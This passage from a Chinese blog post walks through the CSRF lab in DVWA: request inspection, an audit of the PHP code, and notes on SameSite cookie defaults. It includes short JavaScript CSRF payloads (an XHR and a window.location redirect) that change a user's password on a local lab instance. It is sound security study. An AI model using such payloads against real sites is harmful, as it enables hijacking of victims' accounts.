srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113707665_hu83b45cf6d41374fdab532da43f4da5fb_27229_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113707665_hu83b45cf6d41374fdab532da43f4da5fb_27229_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425113707665"
class="gallery-image"
data-flex-grow="189"
data-flex-basis="455px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113713949.png"
width="691"
height="361"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113713949_hub982db786f97e05051e2c58967ba7a51_22558_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113713949_hub982db786f97e05051e2c58967ba7a51_22558_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425113713949"
class="gallery-image"
data-flex-grow="191"
data-flex-basis="459px"
>&lt;/p>
&lt;p>修改后提示 &lt;code>Password changed&lt;/code>，观察下 F12 调试器里的请求和响应头。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425143614395.png"
width="1008"
height="449"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425143614395_hu218a45c37329024b7d96f4732fad50d1_41557_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425143614395_hu218a45c37329024b7d96f4732fad50d1_41557_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425143614395"
class="gallery-image"
data-flex-grow="224"
data-flex-basis="538px"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425143623579.png"
width="450"
height="287"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425143623579_hu33b023caf2ec6ec6032bf544565c0cbf_18590_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425143623579_hu33b023caf2ec6ec6032bf544565c0cbf_18590_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425143623579"
class="gallery-image"
data-flex-grow="156"
data-flex-basis="376px"
>&lt;/p>
&lt;p>接着看一眼表单代码。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113815152.png"
width="520"
height="218"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113815152_hu5f2daf098704a2b708824ee309756675_18422_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425113815152_hu5f2daf098704a2b708824ee309756675_18422_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425113815152"
class="gallery-image"
data-flex-grow="238"
data-flex-basis="572px"
>&lt;/p>
&lt;p>只有我觉得&lt;code>form&lt;/code>里&lt;code>method=GET&lt;/code>是很怪的事情吗？感觉学会写 HTML 以来就没想过在 &lt;code>form&lt;/code> 里用 &lt;code>GET&lt;/code> 方法&amp;hellip;&lt;/p>
&lt;p>咳，回到正题。&lt;/p>
&lt;p>到这里踩点差不多就结束了，可以发现 Low 难度下表单没有 CSRF Token 保护，因此可以简单直接写一个 XHR 修改掉密码。&lt;/p>
&lt;h3 id="题解">题解&lt;/h3>
&lt;p>必须先提一个我实际下手写的时候才踩到的坑，浏览器发展速度实在太快了。&lt;/p>
&lt;p>在&lt;a class="link" href="https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis-05#section-5.3.7" target="_blank" rel="noopener"
>RFC6265bis&lt;/a>里引入了一个新的 Cookies 属性，&lt;code>SameSite&lt;/code>。&lt;a class="link" href="https://developers.google.com/search/blog/2020/01/get-ready-for-new-samesitenone-secure?hl=zh-cn" target="_blank" rel="noopener"
>2019年5月份，谷歌宣布推出了一个默认安全的 Cookie 安全模型&lt;/a>，由新的 Cookie 分类系统（&lt;a class="link" href="https://tools.ietf.org/html/draft-west-cookie-incrementalism-00" target="_blank" rel="noopener"
>规范&lt;/a>）提供支持。在规范（PS：同样是谷歌提出的）中将 &lt;code>SameSite&lt;/code> 默认设置为 &lt;code>Lax&lt;/code>，只允许 Cookies 与顶级导航（包括第三方网站发起的GET请求）一起发送。&lt;/p>
&lt;p>这么说可能有点不好理解，我写了一个简单的 demo，在这项改动之前应该是带上 Cookies 直接发出的请求。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="kd">var&lt;/span> &lt;span class="nx">xhr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">XMLHttpRequest&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="nx">xhr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;get&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/csrf/?password_new=admin&amp;amp;password_conf=admin&amp;amp;Change=Change&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">xhr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">withCredentials&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nx">xhr&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">send&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>但在这项改动之后（现在是2022年4月25日，Chrome内核版本 100，Edge 浏览器），虽然这是个简单请求，无需预检就会发送，但因为 Cookies 的 &lt;code>SameSite&lt;/code> 属性变更为默认 &lt;code>Lax&lt;/code> 的原因，即使设置了 &lt;code>withCredentials=true&lt;/code> 请求里也不会带上 Cookies。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425150932251.png"
width="951"
height="115"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425150932251_huaa8a43c2711e3dfb7b7a9ac3a293cc3a_19838_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425150932251_huaa8a43c2711e3dfb7b7a9ac3a293cc3a_19838_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425150932251"
class="gallery-image"
data-flex-grow="826"
data-flex-basis="1984px"
>&lt;/p>
&lt;p>这就有点恼人，不过稍作变通，还是可以直接控制用户的浏览器发起修改密码的请求，只是没 xhr 那么悄无声息。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="nb">window&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">location&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">href&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;http://localhost:8080/vulnerabilities/csrf/?password_new=123456&amp;amp;password_conf=123456&amp;amp;Change=Change&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>如此一来，就满足了 &lt;code>SameSite=Lax&lt;/code> 的由顶级导航启动的要求。&lt;/p>
&lt;p>这里额外再说一句就是，&lt;code>iframe&lt;/code> 似乎也不被视作顶级导航，因此&lt;code>&amp;lt;iframe src=&amp;quot;...&amp;quot; width=&amp;quot;1&amp;quot; height=&amp;quot;1&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code>也行不通，不会带上 Cookies。&lt;/p>
&lt;p>简单看了下 MDN 对默认 &lt;code>Lax&lt;/code> 策略的支持情况，只有少数几个浏览器还没跟进了。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425160233505.png"
width="810"
height="701"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425160233505_hu0375771f01931166adb29727ee7ccafb_54993_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-03/image-20220425160233505_hu0375771f01931166adb29727ee7ccafb_54993_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220425160233505"
class="gallery-image"
data-flex-grow="115"
data-flex-basis="277px"
>&lt;/p>
&lt;h3 id="代码审计">代码审计&lt;/h3>
&lt;p>又是很短一段 php 代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Change&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;password_new&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$pass_conf&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;password_conf&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Do the passwords match?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nv">$pass_conf&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// They do!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_real_escape_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">trigger_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">E_USER_ERROR&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="nv">$pass_new&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">md5&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Update the database
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$insert&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;UPDATE `users` SET password = &amp;#39;&lt;/span>&lt;span class="si">$pass_new&lt;/span>&lt;span class="s2">&amp;#39; WHERE user = &amp;#39;&amp;#34;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nx">dvwaCurrentUser&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s2">&amp;#34;&amp;#39;;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$insert&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="k">or&lt;/span> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_connect_error&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Feedback for the user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;Password Changed.&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Issue with passwords matching
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;Passwords did not match.&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">((&lt;/span>&lt;span class="nx">is_null&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="k">false&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="nv">$___mysqli_res&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>逻辑很清晰不啰嗦，注意到几个点：&lt;/p>
&lt;ol>
&lt;li>md5 未加盐哈希作为密码字段保存到数据库，得到了哈希有可能被逆推出密码。&lt;/li>
&lt;li>直接拼了 &lt;code>dvwaCurrentUser()&lt;/code>，目前不清楚这个函数里有没有做好转义处理，没处理可能存在 SQL 注入。&lt;/li>
&lt;/ol>
&lt;p>全程这个 &lt;code>$GLOBALS[&amp;quot;___mysqli_ston&amp;quot;]&lt;/code> 到底是个什么玩意儿让我有点懵，搜索了下好像是 SQL 连接，类似 Go 中的 &lt;code>sql.DB&lt;/code> 对象（意会好嘛）。&lt;/p>
&lt;p>别的问题就没看出来了。&lt;/p>
&lt;h3 id="提高难度败北">提高难度（败北）&lt;/h3>
&lt;p>直接使用 Low 难度下的方法，&lt;code>window.location.href&lt;/code>，会报错：&lt;code>That request didn't look correct&lt;/code>。&lt;/p>
&lt;p>简单看一下 Medium 难度下的代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Change&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Checks to see where the request came from
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">stripos&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_SERVER&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;HTTP_REFERER&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">,&lt;/span>&lt;span class="nv">$_SERVER&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;SERVER_NAME&amp;#39;&lt;/span> &lt;span class="p">])&lt;/span> &lt;span class="o">!==&lt;/span> &lt;span class="k">false&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;password_new&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$pass_conf&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;password_conf&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Do the passwords match?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nv">$pass_conf&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// They do!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_real_escape_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">trigger_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">E_USER_ERROR&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="nv">$pass_new&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">md5&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$pass_new&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Update the database
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$insert&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;UPDATE `users` SET password = &amp;#39;&lt;/span>&lt;span class="si">$pass_new&lt;/span>&lt;span class="s2">&amp;#39; WHERE user = &amp;#39;&amp;#34;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nx">dvwaCurrentUser&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s2">&amp;#34;&amp;#39;;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$insert&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="k">or&lt;/span> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">is_object&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">]))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nx">mysqli_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_connect_error&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Feedback for the user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;Password Changed.&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Issue with passwords matching
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;Passwords did not match.&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Didn&amp;#39;t come from a trusted source
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;That request didn&amp;#39;t look correct.&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">((&lt;/span>&lt;span class="nx">is_null&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="k">false&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="nv">$___mysqli_res&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意到主要变化在于进入业务处理前，加上了一条判断：&lt;code>if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false )&lt;/code>。&lt;/p>
&lt;p>&lt;code>stripos&lt;/code> 函数查找子串出现在字符串里的位置，没找到的情况下返回&lt;code>false&lt;/code>，这条判断的意思是在 &lt;code>HTTP_REFERER&lt;/code> 里查找 &lt;code>SERVER_NAME&lt;/code> 是否出现，如果出现才进一步处理。所以 Medium 难度下问题变成了怎么 bypass 这个判断。&lt;/p>
&lt;p>搜索 &lt;code>SERVER_NAME&lt;/code> 的文档可以找到这样的说明：&lt;/p>
&lt;blockquote>
&lt;p>&amp;lsquo;SERVER_NAME&amp;rsquo;&lt;/p>
&lt;p>The name of the server host under which the current script is executing. If the script is running on a virtual host, this will be the value defined for that virtual host.&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>Note&lt;/strong>: Under Apache 2, you must set &lt;code>UseCanonicalName = On&lt;/code> and &lt;code>ServerName&lt;/code>. Otherwise, this value reflects the hostname supplied by the client, which can be spoofed. It is not safe to rely on this value in security-dependent contexts.&lt;/p>
&lt;/blockquote>
&lt;/blockquote>
&lt;p>在 Apache2 环境下，如果没有正确配置 &lt;code>UseCanonicalName = On&lt;/code>和&lt;code>ServerName&lt;/code>的话，&lt;code>$_SERVER['SERVER_NAME']&lt;/code>的值就是 HTTP 请求头里的 Hostname。&lt;/p>
&lt;p>&lt;code>HTTP_REFERER&lt;/code> 的文档这样说：&lt;/p>
&lt;blockquote>
&lt;p>&amp;lsquo;HTTP_REFERER&amp;rsquo;&lt;/p>
&lt;p>The address of the page (if any) which referred the user agent to the current page. This is set by the user agent. Not all user agents will set this, and some provide the ability to modify HTTP_REFERER as a feature. In short, it cannot really be trusted.&lt;/p>
&lt;/blockquote>
&lt;p>但遗憾的是，不管 &lt;code>Host&lt;/code> 还是 &lt;code>Referer&lt;/code> 都无法修改（受制于浏览器的约束），所以尽管文档里说可能存在安全隐患，但反正我这会儿想不出利用方法。&lt;/p>
&lt;p>于是看眼帮助文档，提示需要结合 XSS 之类的洞攻破。这么一说就茅塞顿开了，虽然说是个练习靶场但也不是题目说CSRF就非要顶着CSRF死磕，别的洞一个不碰。（大佬说不定能死磕成功，我也想变大佬啊=。=）&lt;/p>
&lt;p>考虑多个漏洞联合利用确实常见也一定要学，但现在暂且还是免了吧=。=累死。后面捅 XSS 的时候再回头顺便把 Medium 难度做了。&lt;/p>
&lt;p>看了眼 High 难度下同样要结合多个漏洞利用，我寻思能突破 CORS 的话即使有 CSRF Token 也好办，直接 xhr 把表单页拿下来就好。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>好的，现在 CSRF 感觉有点难利用了。主要还是现代浏览器的同源策略越来越严格，往默认安全靠拢，迭代速度快的一批。流传下来的利用方法如今一试就寄，半点屁用没有，连搭一个能复现漏洞的环境都麻烦的一批（比如具体哪个版本的 Chrome 修了&lt;code>SameSite&lt;/code>，去哪儿下载历史版本，搞出一堆浏览器共存巴拉巴拉）&lt;/p>
&lt;p>然后就很难不想起互联网上不停重复的观点了。为什么不要做伸手党？抛开对大环境的影响，伸手党一直有个通病，就是没有学习的能力。这里的学习说的是 &lt;em>收集、整理、归纳、总结、利用&lt;/em> 信息的能力。在一个领域独立探索未知，这是真正独立的标志。&lt;/p>
&lt;p>讲真，太怀念上学的日子了，脑子空空无忧无虑。真正出来工作卖力之后才会渐渐意识到什么叫不进则退。我觉得与其说什么社会在惩罚不努力的人，不如说这个社会在惩罚所有人。也不该说是社会，而是人的天性，让人生来就要受尽苦难。&lt;/p>
